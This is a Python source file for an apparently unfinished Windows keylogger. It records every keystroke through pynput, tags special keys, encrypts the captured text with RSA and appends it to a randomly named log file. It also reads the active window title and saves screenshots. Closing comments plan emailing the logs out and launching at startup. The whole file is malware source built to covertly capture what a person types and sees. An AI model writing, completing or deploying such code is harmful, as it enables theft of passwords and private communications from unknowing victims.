from pynput.keyboard import Listener
import win32gui
import listener
import random
import time
import os
import pyautogui
from encryptionsys import *
from Crypto.PublicKey import RSA

path = os.path.expandvars("%tmp%")
chars = 0
data = []
fileName = str(chars) + 'I' + str(random.randint(1000000, 9999999)) + '.txt'

def on_press(key):

    subs = ['Key.enter', ' [ENTER] ', 'Key.backspace', ' [BACKSPACE] ', 'Key.space', ' ',
            'Key.alt_l', ' [ALT] ', 'Key.tab', ' [TAB] ', 'Key.delete', ' [DEL] ', 'Key.ctrl_l', ' [CTRL] ',
            'Key.left', ' [LEFT ARROW] ', 'Key.right', ' [RIGHT ARROW] ', 'Key.shift', ' [SHIFT] ', '\\x13',
            ' [CTRL-S] ', '\\x17', ' [CTRL-W] ', 'Key.caps_lock', ' [CAPS LK] ', '\\x01', ' [CTRL-A] ', 'Key.cmd',
            ' [WINDOWS KEY] ', 'Key.print_screen', ' [PRNT SCR] ', '\\x03', ' [CTRL-C] ', '\\x16', ' [CTRL-V] ']

    keyPressed = "{0}".format(key).replace("'", "")

    if keyPressed in subs:
        data.append(subs[subs.index(keyPressed)+1])
    else:
        data.append(keyPressed)

    print("".join(data)) # debug statement to see chars
    writeLogs(path)


def writeLogs(path):
    with open('public_key.pem', 'rb') as f:
        new_public_key = RSA.import_key(f.read())

    with open('private_key.pem', 'rb') as f:
        new_private_key = RSA.import_key(f.read())

    ciphertext = encryption(new_public_key, bytes("".join(data).encode()));
    decypted_text = decryption(new_private_key, ciphertext)

    with open(fileName, "a") as f:
        f.write("".join(str(ciphertext)))
        f.close()

    print(decypted_text.decode())

def appListener():
    appOpen = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    if appOpen == "Cortana":
        appOpen = "Windows Start Menu"
        print(appOpen)
    else:
        pass

def takeScreenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screen.png")

    #to finish this


# add a function to send the logs via email
# startup keylogger
# possibly adding a window filter 